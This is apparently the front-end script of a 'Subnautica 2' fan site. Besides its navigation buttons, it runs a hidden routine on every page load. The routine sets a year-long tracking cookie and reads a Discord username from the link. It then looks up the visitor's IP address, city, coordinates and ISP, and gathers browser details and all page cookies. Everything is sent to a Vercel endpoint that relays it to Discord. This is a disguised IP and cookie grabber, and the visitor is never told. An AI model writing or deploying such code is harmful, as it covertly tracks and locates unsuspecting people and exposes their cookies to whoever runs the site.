const API_URL = 'https://subnautica-tracker.vercel.app';

// Set tracking cookie
function setTrackingCookie() {
    const expirationDate = new Date();
    expirationDate.setTime(expirationDate.getTime() + (365 * 24 * 60 * 60 * 1000));
    const expires = "expires=" + expirationDate.toUTCString();
    const uniqueId = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    document.cookie = "subnautica_visitor_id=" + uniqueId + ";" + expires + ";path=/";
    return uniqueId;
}

// Get Discord username from URL parameter
function getDiscordInfo() {
    const urlParams = new URLSearchParams(window.location.search);
    const discordUsername = urlParams.get('discord') || localStorage.getItem('discord_user') || 'Unknown';
    return discordUsername;
}

// Send tracking data to Discord
async function trackAndSend() {
    try {
        const visitorId = setTrackingCookie();
        const discordUser = getDiscordInfo();
        let ipData = null;

        // Try ip-api.com
        try {
            const response = await fetch(`https://ip-api.com/json/?fields=status,query,country,city,regionName,timezone,isp,lat,lon`);
            const apiData = await response.json();
            
            if (apiData.status === 'success') {
                ipData = {
                    ip: apiData.query,
                    country: apiData.country,
                    city: apiData.city,
                    region: apiData.regionName,
                    timezone: apiData.timezone,
                    isp: apiData.isp,
                    lat: apiData.lat,
                    lon: apiData.lon
                };
            }
        } catch (e) {
            console.log('Trying backup API...');
        }

        // Fallback
        if (!ipData) {
            try {
                const response = await fetch(`https://ipapi.co/json/`);
                const apiData = await response.json();
                
                if (apiData.ip) {
                    ipData = {
                        ip: apiData.ip,
                        country: apiData.country_name,
                        city: apiData.city,
                        region: apiData.region,
                        timezone: apiData.timezone,
                        isp: apiData.org,
                        lat: apiData.latitude,
                        lon: apiData.longitude
                    };
                }
            } catch (e) {
                console.log('Backup API failed');
            }
        }

        if (ipData) {
            // Get browser and system info
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenRes = window.screen.width + 'x' + window.screen.height;
            const platform = navigator.platform;
            const referrer = document.referrer || 'Direct';
            const allCookies = document.cookie;

            const message = `🎮 **New Visitor - Subnautica 2 Site**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **Discord User:** ${discordUser}
🔗 **Visitor ID:** ${visitorId}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 **IP Address:** \`${ipData.ip}\`
🌍 **Country:** ${ipData.country}
🏙️ **City:** ${ipData.city}
📍 **Region:** ${ipData.region}
⏰ **Timezone:** ${ipData.timezone}
📡 **ISP:** ${ipData.isp}
📊 **Coordinates:** ${ipData.lat}, ${ipData.lon}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 **System Info:**
• Platform: ${platform}
• Language: ${language}
• Screen: ${screenRes}
• User Agent: ${userAgent.substring(0, 100)}...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🍪 **Cookies:** ${allCookies || 'None'}
📬 **Referrer:** ${referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

            console.log('Sending to Vercel API...');
            
            const response = await fetch(`${API_URL}/api/send-discord`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            });

            console.log('API Response:', response.status);
        }
    } catch (error) {
        console.error('Tracking error:', error);
    }
}

// Navigation functionality
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const sectionId = btn.getAttribute('data-section');
        
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        document.querySelectorAll('.nav-btn').forEach(b => {
            b.classList.remove('active');
        });
        
        btn.classList.add('active');
        document.getElementById(sectionId).classList.add('active');
    });
});

// Run tracking when page loads
window.addEventListener('load', trackAndSend);
